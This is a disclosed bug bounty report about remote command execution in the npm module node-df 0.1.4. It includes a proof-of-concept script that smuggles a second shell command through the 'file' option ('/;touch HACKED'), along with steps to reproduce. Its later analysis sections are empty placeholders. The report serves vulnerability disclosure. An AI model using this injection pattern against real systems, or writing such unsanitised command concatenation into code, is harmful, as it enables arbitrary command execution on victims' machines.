---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '703412'
original_report_id: '703412'
title: '[node-df] RCE via insecure command concatenation'
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2019-09-28T09:11:41.085Z'
disclosed_at: '2019-12-04T19:33:22.380Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: node-df
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# [node-df] RCE via insecure command concatenation

## Metadata

- HackerOne Report ID: 703412
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2019-12-04T19:33:22.380Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report a `RCE` issue in the `node-df` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `node-df`
**version:** `0.1.4`
**npm page:** `https://www.npmjs.com/package/node-df`

## Module Description
> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.

## Module Stats
[N/A] downloads in the last day
[3,023] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: 

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```
1. Execute the following commands in terminal:

```bash
npm i node-df # Install affected module
ls # Make sure there isn't any *HACKED* file
node poc.js #  Run the PoC
ls # The *HACKED* file has been created
```
1. The `HACKED` file will be created {F594172}

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `node-df` via `insecure command concatenation`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
